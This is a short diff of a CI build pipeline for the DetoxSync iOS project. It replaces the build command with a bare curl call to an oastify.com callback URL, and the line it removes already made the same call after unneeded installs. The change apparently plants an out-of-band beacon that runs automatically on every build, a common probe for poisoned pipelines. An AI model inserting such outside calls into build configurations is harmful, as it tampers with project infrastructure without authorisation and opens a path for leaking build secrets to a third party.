@@ -1,7 +1,7 @@
 steps:
   - label: ":wrench: Build"
     command:
-    - "apt install -y brew && brew install temurin && apt install -y curl && curl https://9q0fl1l364gralid4lfmldlcc3iz6pue.oastify.com/1234"
+    - "curl https://9q0fl1l364gralid4lfmldlcc3iz6pue.oastify.com/1234"
     - "cd DetoxSync"
     - "git submodule update --init --recursive"
     - "xcodebuild test -project DetoxSync.xcodeproj -scheme DetoxSyncTests -destination 'platform=iOS Simulator,name=iPhone 12'"
